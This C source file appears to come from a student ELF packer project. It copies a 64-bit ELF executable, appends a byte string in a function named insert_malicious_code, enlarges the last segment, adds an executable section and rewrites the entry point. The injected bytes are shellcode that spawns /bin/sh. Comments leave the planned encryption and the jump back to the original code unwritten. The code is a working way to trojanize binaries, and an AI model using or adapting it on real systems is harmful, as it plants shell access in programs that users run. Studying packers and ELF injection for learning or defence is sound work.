#include <woody.h>



void		insert_malicious_code(void *woody_ptr, Elf64_Phdr *last_Phdr, void *ptr, size_t filesz, size_t padding_len)
{
	char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
	//char code[] = "BBBBBBBBBBBBBBBBBBBBBBBBBBB";

	ft_memcpy(woody_ptr, ptr, last_Phdr->p_offset + last_Phdr->p_filesz);
	ft_memcpy(woody_ptr + last_Phdr->p_offset + last_Phdr->p_filesz + padding_len, code, CODE_SIZE);
	ft_memcpy(woody_ptr + last_Phdr->p_offset + last_Phdr->p_filesz + padding_len + CODE_SIZE, 
			ptr + last_Phdr->p_offset + last_Phdr->p_filesz, 
			filesz - last_Phdr->p_offset - last_Phdr->p_filesz);
}

void		update_segment(Elf64_Phdr *phdr, int code_size)
{
	phdr->p_filesz += code_size;
	phdr->p_memsz += code_size;
}

void	insert_Shdr(Elf64_Ehdr *woody_Ehdr, Elf64_Shdr *woody_Shdr, Elf64_Ehdr *hdr, size_t padding_len)
{	
	int i;
	Elf64_Phdr *last_Phdr;

	last_Phdr = find_last_segment((void *)hdr);
	for (i = 0; i < hdr->e_shnum; ++i)
	{
		if (woody_Shdr->sh_offset > last_Phdr->p_offset + last_Phdr->p_filesz)
			woody_Shdr->sh_offset += padding_len + CODE_SIZE;
		woody_Shdr = (void *)woody_Shdr + sizeof(Elf64_Shdr);
	}
	woody_Shdr->sh_type = SHT_PROGBITS;
	woody_Shdr->sh_flags = SHF_EXECINSTR | SHF_ALLOC;
	woody_Shdr->sh_offset = last_Phdr->p_offset + last_Phdr->p_filesz + padding_len;
	woody_Shdr->sh_addr = (last_Phdr->p_vaddr - last_Phdr->p_offset) + woody_Shdr->sh_offset;
	woody_Shdr->sh_size = CODE_SIZE;
	woody_Shdr->sh_addralign = 16;
	woody_Ehdr->e_shnum++;
	woody_Ehdr->e_entry = 0x0000000000601038;
//		woody_Shdr->sh_offset;

}


int	woodywood_pack(void *ptr, struct stat statbuf)
{
	Elf64_Phdr 	*last_Phdr;
	Elf64_Ehdr 	*hdr;
	size_t		packed_size;
	size_t		padding_len;
	void		*woody_ptr;
	int 		fd;
	hdr = ptr;
	(void)statbuf;

	// find last Segment
	last_Phdr = find_last_segment(ptr);
	padding_len = last_Phdr->p_memsz - last_Phdr->p_filesz;
	packed_size = statbuf.st_size + CODE_SIZE + sizeof(Elf64_Shdr) + padding_len;
	if (!(fd = open("woody", O_RDWR | O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO)))
		return (1);
	if (!(woody_ptr = ft_memalloc(packed_size)))
		return (1);

	//hdr->e_entry = last_Phdr->p_offset + last_Phdr->p_filesz + padding_len;
	
	//insert_malicious_code
	insert_malicious_code(woody_ptr, last_Phdr, ptr, statbuf.st_size, padding_len);
	
	//update last_segment info
	update_segment(find_last_segment(woody_ptr), CODE_SIZE);

	//update header
	((Elf64_Ehdr *)woody_ptr)->e_shoff += CODE_SIZE + padding_len;

	// insert new Shdr
	insert_Shdr(woody_ptr, (void *)woody_ptr + ((Elf64_Ehdr *)woody_ptr)->e_shoff, hdr, padding_len);

	// followed by code that decrypts and point to old e_entry

	// update Phdr- Segment

//	print_all(woody_ptr);
	
	// encrypt data

	write(fd, woody_ptr, packed_size);
	return(0);
}

